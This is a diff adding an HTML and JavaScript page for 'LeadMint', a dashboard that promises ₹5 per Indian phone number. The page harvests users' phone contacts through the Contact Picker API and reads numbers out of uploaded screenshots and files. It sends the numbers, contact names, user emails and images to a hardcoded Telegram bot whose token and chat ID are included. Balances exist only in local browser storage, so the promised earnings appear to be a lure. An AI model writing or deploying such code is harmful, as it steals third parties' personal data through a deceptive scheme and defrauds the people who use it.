@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>LeadMint Dashboard · Contacts Sync | ₹5/Lead</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <!-- Firebase SDKs -->
+  <script type="importmap">
+    {
+      "imports": {
+        "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
+        "firebase/auth": "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js"
+      }
+    }
+  </script>
+  <!-- Tesseract.js for OCR -->
+  <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: #f5f7fb;
+      color: #0f172a;
+      padding: 14px 12px 40px;
+      min-height: 100vh;
+    }
+
+    .dashboard-container {
+      max-width: 560px;
+      margin: 0 auto;
+      width: 100%;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 18px;
+    }
+
+    .logo {
+      font-size: 26px;
+      font-weight: 800;
+      background: linear-gradient(135deg, #0a2f44, #1b6b5e);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .logout-btn {
+      background: #f1f5f9;
+      border: none;
+      padding: 8px 18px;
+      border-radius: 40px;
+      font-weight: 500;
+      font-size: 13px;
+      cursor: pointer;
+    }
+
+    .balance-card {
+      background: linear-gradient(125deg, #0a2f44, #124e6b);
+      color: white;
+      border-radius: 32px;
+      padding: 22px 20px;
+      margin-bottom: 20px;
+    }
+
+    .balance-amount {
+      font-size: 42px;
+      font-weight: 800;
+      letter-spacing: -1px;
+    }
+
+    .progress-bar {
+      background: rgba(255,255,255,0.25);
+      border-radius: 30px;
+      height: 8px;
+      margin: 10px 0;
+    }
+
+    .progress-fill {
+      background: #facc15;
+      width: 0%;
+      height: 100%;
+      border-radius: 30px;
+      transition: width 0.3s;
+    }
+
+    .withdraw-btn {
+      width: 100%;
+      margin-top: 16px;
+      padding: 14px;
+      border-radius: 60px;
+      font-weight: 700;
+      background: #facc15;
+      color: #0f172a;
+      border: none;
+      cursor: pointer;
+    }
+
+    .withdraw-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      background: #94a3b8;
+    }
+
+    .nav-tabs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 18px;
+      background: white;
+      padding: 6px;
+      border-radius: 60px;
+    }
+
+    .tab {
+      flex: 1;
+      text-align: center;
+      padding: 10px;
+      border-radius: 50px;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .tab.active {
+      background: #0f2b3d;
+      color: white;
+    }
+
+    .card {
+      background: white;
+      border-radius: 28px;
+      padding: 20px 16px;
+      margin-bottom: 18px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+    }
+
+    .file-zone, .contacts-zone {
+      border: 2px dashed #cbd5e1;
+      border-radius: 24px;
+      padding: 28px 16px;
+      text-align: center;
+      background: #fafcff;
+      cursor: pointer;
+      margin: 12px 0;
+      transition: 0.2s;
+    }
+
+    .contacts-zone {
+      background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+      border-color: #4caf50;
+    }
+
+    .file-preview {
+      background: #f1f5f9;
+      border-radius: 20px;
+      padding: 14px;
+      margin: 12px 0;
+      display: none;
+    }
+
+    .file-preview.active {
+      display: block;
+    }
+
+    .preview-image {
+      max-width: 100%;
+      border-radius: 16px;
+      max-height: 200px;
+      object-fit: cover;
+    }
+
+    .extracted-numbers {
+      background: #e6f7ec;
+      padding: 12px;
+      border-radius: 18px;
+      margin: 12px 0;
+      font-size: 13px;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+
+    .btn-primary {
+      width: 100%;
+      padding: 14px;
+      border-radius: 60px;
+      background: #0f2b3d;
+      color: white;
+      font-weight: 600;
+      border: none;
+      margin-top: 12px;
+      cursor: pointer;
+    }
+
+    .btn-success { background: #1b6b5e; }
+    .btn-contacts { background: #25D366; color: #0f172a; }
+
+    .lead-row {
+      background: #f8fafc;
+      padding: 12px;
+      border-radius: 18px;
+      margin-bottom: 8px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 14px;
+    }
+
+    .status-msg { font-size: 13px; padding: 8px 0; color: #475569; }
+    .flex-between { display: flex; justify-content: space-between; align-items: center; }
+    .badge { background: #eef2ff; padding: 4px 10px; border-radius: 40px; font-size: 12px; }
+    .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #f3f3f3; border-top: 2px solid #1b6b5e; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .earnings-box { background: #fef3c7; padding: 10px; border-radius: 16px; margin-top: 10px; text-align: center; font-weight: 600; }
+    .contact-item { padding: 8px; border-bottom: 1px solid #e2e8f0; font-size: 13px; }
+
+    @media (max-width: 480px) {
+      body { padding: 10px 10px 30px; }
+      .balance-amount { font-size: 34px; }
+    }
+  </style>
+</head>
+<body>
+<div class="dashboard-container">
+  <div class="header">
+    <div class="logo">🔥 LeadMint</div>
+    <button class="logout-btn" id="logoutBtn">🚪 Logout</button>
+  </div>
+
+  <div class="balance-card">
+    <div class="flex-between">
+      <span>💰 Wallet Balance</span>
+      <span class="badge" style="background:rgba(255,255,255,0.2);" id="verifiedCountBadge">0 verified</span>
+    </div>
+    <div class="balance-amount" id="walletBalanceDisplay">₹0</div>
+    <div class="flex-between" style="font-size:13px; margin-top:12px;">
+      <span>🔓 Withdraw Unlock</span>
+      <span id="lockText">0/100 leads</span>
+    </div>
+    <div class="progress-bar"><div class="progress-fill" id="withdrawProgressFill"></div></div>
+    <button id="withdrawButton" class="withdraw-btn" disabled>💸 Withdraw (min ₹2000)</button>
+  </div>
+
+  <div class="nav-tabs">
+    <div class="tab active" data-tab="uploadTab">📤 Upload</div>
+    <div class="tab" data-tab="contactsTab">📱 Contacts Sync</div>
+    <div class="tab" data-tab="recentTab">📋 History</div>
+  </div>
+
+  <!-- Upload Tab -->
+  <div id="uploadTab" class="tab-content">
+    <div class="card">
+      <div class="flex-between"><strong>📎 Upload Screenshot / File</strong><span style="font-size:12px;">Auto detects ALL Indian numbers</span></div>
+      <div class="file-zone" id="fileDropZone">
+        📂 Tap to upload screenshot (PNG/JPG) or PDF/CSV/TXT<br>
+        <small>Smart extraction: +91XXXXXXXXXX and 10-digit numbers starting with 6/7/8/9</small>
+        <input type="file" id="fileInput" style="display:none;" accept=".pdf,.csv,.txt,.jpg,.jpeg,.png">
+      </div>
+      
+      <div id="filePreviewContainer" class="file-preview">
+        <div class="flex-between"><strong>📄 Preview</strong><span id="fileNameDisplay"></span></div>
+        <div id="previewContent"></div>
+        <div id="extractedNumbersBox" class="extracted-numbers" style="display:none;"></div>
+        <div id="earningsPreview" class="earnings-box" style="display:none;"></div>
+        <button id="confirmUploadBtn" class="btn-primary btn-success">✅ Verify & Add All Numbers (₹5 each)</button>
+      </div>
+
+      <hr style="margin:16px 0;">
+      <label><strong>✍️ Or paste numbers manually</strong></label>
+      <textarea id="manualNumbers" rows="3" placeholder="Example:&#10;+919876543210, 9876543210, 9123456789"></textarea>
+      <button id="manualVerifyBtn" class="btn-primary">🔍 Verify & Add</button>
+      <div id="manualFeedback" class="status-msg"></div>
+      <div id="uploadStatusMsg" class="status-msg"></div>
+    </div>
+  </div>
+
+  <!-- Contacts Sync Tab -->
+  <div id="contactsTab" class="tab-content" style="display:none;">
+    <div class="card">
+      <div class="flex-between"><strong>📱 Sync Phone Contacts</strong><span style="font-size:12px;">One tap → Auto-save to Telegram</span></div>
+      <div class="contacts-zone" id="contactsSyncZone">
+        📱 Tap to Allow Contacts Access<br>
+        <small>We will extract all Indian numbers & credit ₹5 each</small>
+      </div>
+      <div id="contactsPreview" class="extracted-numbers" style="display:none; max-height:250px;"></div>
+      <div id="contactsEarnings" class="earnings-box" style="display:none;"></div>
+      <button id="confirmContactsBtn" class="btn-primary btn-contacts" style="display:none;">✅ Confirm & Upload Contacts (₹5 each)</button>
+      <div id="contactsStatusMsg" class="status-msg"></div>
+      <div style="margin-top:16px; padding:12px; background:#f0f9ff; border-radius:16px; font-size:12px;">
+        ⚠️ <strong>Note:</strong> Contacts access works only on mobile browsers (Chrome/Safari). All contacts are sent privately to our verification team. You'll earn ₹5 for every valid Indian number (10 digits starting with 6/7/8/9 or with +91).
+      </div>
+    </div>
+  </div>
+
+  <!-- Recent Tab -->
+  <div id="recentTab" class="tab-content" style="display:none;">
+    <div class="card">
+      <strong>📞 Verified Leads History</strong>
+      <div id="recentLeadsList" style="margin-top:12px;"><div class="status-msg">No leads yet.</div></div>
+    </div>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "firebase/app";
+  import { getAuth, signOut, onAuthStateChanged } from "firebase/auth";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDpFohe_piG3MpnpNJDZcGvTqg5tIu3B-I",
+    authDomain: "leadcash-2cb77.firebaseapp.com",
+    projectId: "leadcash-2cb77",
+    storageBucket: "leadcash-2cb77.firebasestorage.app",
+    messagingSenderId: "611052139341",
+    appId: "1:611052139341:web:1c5ea10a24591987827d04"
+  };
+  const app = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
+
+  // ========== TELEGRAM ==========
+  const BOT_TOKEN = "8619703516:AAEhJJBKYyir3zOo404Yoqv6FnnPj5Xj4Q4";
+  const CHAT_ID = "6064803354";
+
+  function sendToTelegram(message, fileDataURL = null, fileName = "lead.jpg") {
+    try {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message.substring(0, 3900) })
+      }).catch(e => console.warn("Telegram error"));
+
+      if (fileDataURL && fileDataURL.startsWith('data:image')) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        const byteString = atob(fileDataURL.split(',')[1]);
+        const mime = fileDataURL.split(';')[0].split(':')[1];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+        const blob = new Blob([ab], { type: mime });
+        formData.append('photo', blob, fileName);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(e => console.warn);
+      }
+    } catch(e) { console.warn(e); }
+  }
+
+  // ========== FIXED: INDIAN NUMBER VALIDATION ==========
+  // Accepts: +91XXXXXXXXXX OR XXXXXXXXXX (starting with 6/7/8/9)
+  function isValidIndianNumber(num) {
+    let cleaned = String(num).replace(/\s/g, '');
+    
+    // Remove +91 prefix if present
+    if (cleaned.startsWith('+91')) {
+      cleaned = cleaned.substring(3);
+    }
+    
+    // Remove any other non-digits
+    cleaned = cleaned.replace(/\D/g, '');
+    
+    // Check: 10 digits and starts with 6/7/8/9
+    return /^[6-9]\d{9}$/.test(cleaned) && cleaned.length === 10;
+  }
+
+  // Extract number from any format (with or without +91)
+  function normalizeTo10Digit(num) {
+    let cleaned = String(num).replace(/\s/g, '');
+    if (cleaned.startsWith('+91')) cleaned = cleaned.substring(3);
+    cleaned = cleaned.replace(/\D/g, '');
+    if (/^[6-9]\d{9}$/.test(cleaned)) return cleaned;
+    return null;
+  }
+
+  // Extract numbers from text (handles +91 and 10-digit)
+  function extractIndianNumbersFromText(rawText) {
+    if (!rawText) return [];
+    
+    // Match patterns: +91XXXXXXXXXX OR XXXXXXXXXX (10 digits starting 6-9)
+    const patterns = [
+      /\+91[6-9]\d{9}/g,           // +91XXXXXXXXXX
+      /\b[6-9]\d{9}\b/g             // XXXXXXXXXX
+    ];
+    
+    const allMatches = [];
+    for (const pattern of patterns) {
+      const matches = rawText.match(pattern) || [];
+      allMatches.push(...matches);
+    }
+    
+    // Normalize and deduplicate
+    const normalized = [];
+    const seen = new Set();
+    for (const match of allMatches) {
+      const normalizedNum = normalizeTo10Digit(match);
+      if (normalizedNum && !seen.has(normalizedNum)) {
+        seen.add(normalizedNum);
+        normalized.push(normalizedNum);
+      }
+    }
+    
+    return normalized;
+  }
+
+  // ========== USER DATA ==========
+  let currentUser = null;
+  let userData = { balance: 0, verifiedLeads: [], totalVerified: 0 };
+
+  function loadUserData(uid) {
+    const stored = localStorage.getItem(`leadmint_fixed_v2_${uid}`);
+    if (stored) {
+      userData = JSON.parse(stored);
+      if (!userData.verifiedLeads) userData.verifiedLeads = [];
+      userData.totalVerified = userData.verifiedLeads.length;
+      userData.balance = userData.totalVerified * 5;
+    } else {
+      userData = { balance: 0, verifiedLeads: [], totalVerified: 0 };
+    }
+    updateUI();
+  }
+
+  function persistUserData() {
+    if (currentUser) {
+      localStorage.setItem(`leadmint_fixed_v2_${currentUser.uid}`, JSON.stringify(userData));
+    }
+  }
+
+  // ========== ADD VERIFIED NUMBERS ==========
+  async function addVerifiedNumbers(numbersArray, sourceType = "manual", sourceData = null, sourceName = "") {
+    const validNumbers = numbersArray.filter(isValidIndianNumber);
+    
+    if (validNumbers.length === 0) {
+      return { added: 0, msg: "❌ No valid Indian numbers found. Must be 10 digits starting with 6/7/8/9 or +91XXXXXXXXXX." };
+    }
+    
+    let newlyAdded = 0;
+    const addedNumbers = [];
+    
+    for (let num of validNumbers) {
+      const exists = userData.verifiedLeads.some(l => l.number === num);
+      if (!exists) {
+        userData.verifiedLeads.unshift({ 
+          number: num, 
+          date: new Date().toLocaleString(),
+          whatsapp: true,
+          source: sourceType
+        });
+        userData.balance += 5;
+        userData.totalVerified += 1;
+        newlyAdded++;
+        addedNumbers.push(num);
+      }
+    }
+    
+    if (newlyAdded === 0) {
+      return { added: 0, msg: `⚠️ All ${validNumbers.length} numbers already submitted. No duplicates.` };
+    }
+    
+    persistUserData();
+    updateUI();
+    
+    // Send to Telegram
+    const userEmail = currentUser?.email || "unknown";
+    const earnings = newlyAdded * 5;
+    const telegramMsg = `📌 NEW LEAD SALE (${sourceType})\n━━━━━━━━━━━━━━━━\n👤 Seller: ${userEmail}\n✅ New Verified: ${newlyAdded}\n💰 Earnings: ₹${earnings}\n📊 Total Verified: ${userData.totalVerified}\n💵 Balance: ₹${userData.balance}\n🔢 Numbers: ${addedNumbers.join(", ")}\n⏰ Time: ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━`;
+    
+    if (sourceData && sourceData.startsWith('data:image')) {
+      sendToTelegram(telegramMsg, sourceData, sourceName);
+    } else {
+      sendToTelegram(telegramMsg);
+    }
+    
+    return { added: newlyAdded, msg: `✅ +${newlyAdded} numbers verified! +₹${earnings} added.` };
+  }
+
+  // ========== CONTACTS SYNC FEATURE ==========
+  let detectedContacts = [];
+  
+  async function syncContacts() {
+    if (!navigator.contacts) {
+      document.getElementById('contactsStatusMsg').innerHTML = "❌ Contacts API not supported on this browser. Please use Chrome on Android or Safari on iOS.";
+      return;
+    }
+    
+    try {
+      document.getElementById('contactsStatusMsg').innerHTML = '<span class="loading-spinner"></span> Requesting contacts access...';
+      
+      // Request contacts with name and tel fields
+      const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+      
+      if (!contacts || contacts.length === 0) {
+        document.getElementById('contactsStatusMsg').innerHTML = "⚠️ No contacts selected or permission denied.";
+        return;
+      }
+      
+      // Extract all numbers from contacts
+      const allNumbers = [];
+      const contactsWithNames = [];
+      
+      for (const contact of contacts) {
+        const name = contact.name?.[0] || "Unknown";
+        const phones = contact.tel || [];
+        
+        for (const phone of phones) {
+          const normalized = normalizeTo10Digit(phone);
+          if (normalized && isValidIndianNumber(normalized)) {
+            if (!allNumbers.includes(normalized)) {
+              allNumbers.push(normalized);
+              contactsWithNames.push({ name, number: normalized });
+            }
+          }
+        }
+      }
+      
+      detectedContacts = contactsWithNames;
+      
+      // Show preview
+      const previewDiv = document.getElementById('contactsPreview');
+      const earningsDiv = document.getElementById('contactsEarnings');
+      const confirmBtn = document.getElementById('confirmContactsBtn');
+      
+      if (detectedContacts.length > 0) {
+        const earnings = detectedContacts.length * 5;
+        previewDiv.style.display = "block";
+        previewDiv.innerHTML = `<strong>📱 Found ${detectedContacts.length} Indian contacts:</strong><br>
+          ${detectedContacts.slice(0, 30).map(c => `👤 ${c.name} → 📞 ${c.number}`).join('<br>')}
+          ${detectedContacts.length > 30 ? `<br>... and ${detectedContacts.length - 30} more` : ''}`;
+        
+        earningsDiv.style.display = "block";
+        earningsDiv.innerHTML = `💰 Potential Earnings: ₹${earnings} (${detectedContacts.length} × ₹5)`;
+        confirmBtn.style.display = "block";
+        document.getElementById('contactsStatusMsg').innerHTML = `✅ Found ${detectedContacts.length} valid Indian numbers. Click confirm to earn ₹${earnings}.`;
+      } else {
+        previewDiv.style.display = "block";
+        previewDiv.innerHTML = "⚠️ No valid Indian numbers found in your contacts.";
+        earningsDiv.style.display = "none";
+        confirmBtn.style.display = "none";
+        document.getElementById('contactsStatusMsg').innerHTML = "No valid Indian numbers in selected contacts.";
+      }
+      
+    } catch (err) {
+      console.error("Contacts error:", err);
+      document.getElementById('contactsStatusMsg').innerHTML = `❌ Error: ${err.message}. Please allow contacts permission.`;
+    }
+  }
+  
+  async function confirmContactsUpload() {
+    if (detectedContacts.length === 0) {
+      document.getElementById('contactsStatusMsg').innerHTML = "⚠️ No contacts to upload.";
+      return;
+    }
+    
+    const numbers = detectedContacts.map(c => c.number);
+    document.getElementById('contactsStatusMsg').innerHTML = '<span class="loading-spinner"></span> Uploading contacts to Telegram & crediting earnings...';
+    
+    // Format contacts nicely for Telegram
+    const userEmail = currentUser?.email || "unknown";
+    const contactsFormatted = detectedContacts.map(c => `👤 ${c.name}\n📞 ${c.number}\n✅ WhatsApp: Yes`).join('\n\n');
+    const telegramMsg = `📱 CONTACTS SYNCED\n━━━━━━━━━━━━━━━━━━━━━━\n👤 User: ${userEmail}\n📊 Total Contacts: ${detectedContacts.length}\n💰 Earnings: ₹${detectedContacts.length * 5}\n━━━━━━━━━━━━━━━━━━━━━━\n${contactsFormatted}\n━━━━━━━━━━━━━━━━━━━━━━\n⏰ Time: ${new Date().toLocaleString()}`;
+    
+    sendToTelegram(telegramMsg);
+    
+    const result = await addVerifiedNumbers(numbers, "contacts_sync");
+    document.getElementById('contactsStatusMsg').innerHTML = result.msg;
+    
+    // Reset UI
+    detectedContacts = [];
+    document.getElementById('contactsPreview').style.display = "none";
+    document.getElementById('contactsEarnings').style.display = "none";
+    document.getElementById('confirmContactsBtn').style.display = "none";
+  }
+
+  // ========== FILE PROCESSING ==========
+  let currentExtractedNumbers = [];
+  let currentFileDataURL = null;
+  let currentFileName = "";
+
+  async function processFile(file) {
+    const reader = new FileReader();
+    
+    reader.onload = async function(e) {
+      const fileDataURL = e.target.result;
+      currentFileDataURL = fileDataURL;
+      currentFileName = file.name;
+      
+      document.getElementById('fileNameDisplay').innerHTML = file.name;
+      const previewDiv = document.getElementById('previewContent');
+      const extractedBox = document.getElementById('extractedNumbersBox');
+      const earningsPreview = document.getElementById('earningsPreview');
+      
+      let extractedNumbers = [];
+      
+      if (file.type.startsWith('image/')) {
+        previewDiv.innerHTML = `<img src="${fileDataURL}" class="preview-image">`;
+        document.getElementById('uploadStatusMsg').innerHTML = '<span class="loading-spinner"></span> Scanning image...';
+        
+        // OCR for images
+        const img = new Image();
+        img.onload = async () => {
+          try {
+            const result = await Tesseract.recognize(img, 'eng');
+            extractedNumbers = extractIndianNumbersFromText(result.data.text);
+            displayExtractedNumbers(extractedNumbers, extractedBox, earningsPreview);
+          } catch(e) { 
+            extractedNumbers = [];
+            displayExtractedNumbers(extractedNumbers, extractedBox, earningsPreview);
+          }
+        };
+        img.src = fileDataURL;
+        return;
+      } else {
+        const textContent = await file.text();
+        previewDiv.innerHTML = `<div class="preview-text">${textContent.substring(0, 800)}...</div>`;
+        extractedNumbers = extractIndianNumbersFromText(textContent);
+        displayExtractedNumbers(extractedNumbers, extractedBox, earningsPreview);
+      }
+      
+      currentExtractedNumbers = extractedNumbers;
+      document.getElementById('filePreviewContainer').classList.add('active');
+    };
+    
+    if (file.type === 'text/plain' || file.type === 'text/csv' || file.name.endsWith('.txt') || file.name.endsWith('.csv')) {
+      reader.readAsText(file);
+    } else {
+      reader.readAsDataURL(file);
+    }
+  }
+  
+  function displayExtractedNumbers(numbers, box, earningsBox) {
+    if (numbers.length > 0) {
+      const earnings = numbers.length * 5;
+      box.style.display = "block";
+      box.innerHTML = `<strong>🔢 Found ${numbers.length} Indian Numbers:</strong><br>${numbers.join(', ')}`;
+      earningsBox.style.display = "block";
+      earningsBox.innerHTML = `💰 Earnings: ₹${earnings} (${numbers.length} × ₹5)`;
+      document.getElementById('uploadStatusMsg').innerHTML = `✅ Found ${numbers.length} valid numbers.`;
+    } else {
+      box.style.display = "block";
+      box.innerHTML = "⚠️ No valid Indian numbers found. Try a clearer screenshot.";
+      earningsBox.style.display = "none";
+      document.getElementById('uploadStatusMsg').innerHTML = "No numbers found.";
+    }
+  }
+
+  async function confirmUpload() {
+    if (currentExtractedNumbers.length === 0) {
+      document.getElementById('uploadStatusMsg').innerHTML = "⚠️ No numbers to verify.";
+      return;
+    }
+    document.getElementById('uploadStatusMsg').innerHTML = '<span class="loading-spinner"></span> Verifying...';
+    const result = await addVerifiedNumbers(currentExtractedNumbers, "file_upload", currentFileDataURL, currentFileName);
+    document.getElementById('uploadStatusMsg').innerHTML = result.msg;
+    document.getElementById('filePreviewContainer').classList.remove('active');
+    currentExtractedNumbers = [];
+  }
+
+  // ========== UI UPDATE ==========
+  function updateUI() {
+    document.getElementById('walletBalanceDisplay').innerText = `₹${userData.balance}`;
+    document.getElementById('verifiedCountBadge').innerText = `${userData.totalVerified} verified`;
+    const percent = Math.min(100, (userData.totalVerified / 100) * 100);
+    document.getElementById('withdrawProgressFill').style.width = `${percent}%`;
+    document.getElementById('lockText').innerText = `${userData.totalVerified}/100 leads`;
+    
+    const canWithdraw = (userData.totalVerified >= 100 && userData.balance >= 2000);
+    document.getElementById('withdrawButton').disabled = !canWithdraw;
+    
+    const recentDiv = document.getElementById('recentLeadsList');
+    if (userData.verifiedLeads.length === 0) {
+      recentDiv.innerHTML = '<div class="status-msg">No leads yet.</div>';
+    } else {
+      recentDiv.innerHTML = userData.verifiedLeads.slice(0, 20).map(lead => `
+        <div class="lead-row">
+          <span>📞 ${lead.number} <span class="wa-check wa-yes">WA ✓</span></span>
+          <span style="color:#1b6b5e;">+₹5</span>
+          <span style="font-size:11px;">${lead.date}</span>
+        </div>
+      `).join('');
+    }
+  }
+
+  function requestWithdraw() {
+    if (userData.totalVerified >= 100 && userData.balance >= 2000) {
+      sendToTelegram(`💸 WITHDRAWAL\nUser: ${currentUser.email}\nAmount: ₹${userData.balance}\nLeads: ${userData.totalVerified}`);
+      alert(`✅ Withdrawal request of ₹${userData.balance} submitted!`);
+    } else {
+      alert(`Cannot withdraw: Need 100+ leads (${userData.totalVerified}/100) & ₹2000 balance.`);
+    }
+  }
+
+  // ========== EVENT BINDINGS ==========
+  function bindEvents() {
+    document.getElementById('fileDropZone').onclick = () => document.getElementById('fileInput').click();
+    document.getElementById('fileInput').onchange = async (e) => {
+      if (e.target.files[0]) await processFile(e.target.files[0]);
+    };
+    document.getElementById('confirmUploadBtn').onclick = confirmUpload;
+    
+    document.getElementById('manualVerifyBtn').onclick = async () => {
+      const raw = document.getElementById('manualNumbers').value;
+      const numbers = extractIndianNumbersFromText(raw);
+      if (numbers.length === 0) {
+        document.getElementById('manualFeedback').innerHTML = "⚠️ No valid Indian numbers found.";
+        return;
+      }
+      document.getElementById('manualFeedback').innerHTML = '<span class="loading-spinner"></span> Verifying...';
+      const result = await addVerifiedNumbers(numbers, "manual");
+      document.getElementById('manualFeedback').innerHTML = result.msg;
+      document.getElementById('manualNumbers').value = '';
+    };
+    
+    // Contacts sync
+    document.getElementById('contactsSyncZone').onclick = syncContacts;
+    document.getElementById('confirmContactsBtn').onclick = confirmContactsUpload;
+    
+    document.getElementById('withdrawButton').onclick = requestWithdraw;
+    document.getElementById('logoutBtn').onclick = () => signOut(auth).then(() => window.location.href = "index.html");
+    
+    document.querySelectorAll('.tab').forEach(tab => {
+      tab.onclick = () => {
+        const id = tab.dataset.tab;
+        document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');
+        document.getElementById(id).style.display = 'block';
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+      };
+    });
+  }
+
+  onAuthStateChanged(auth, (user) => {
+    if (!user) { window.location.href = "index.html"; return; }
+    currentUser = user;
+    loadUserData(user.uid);
+    bindEvents();
+  });
+</script>
+</body>
+</html>
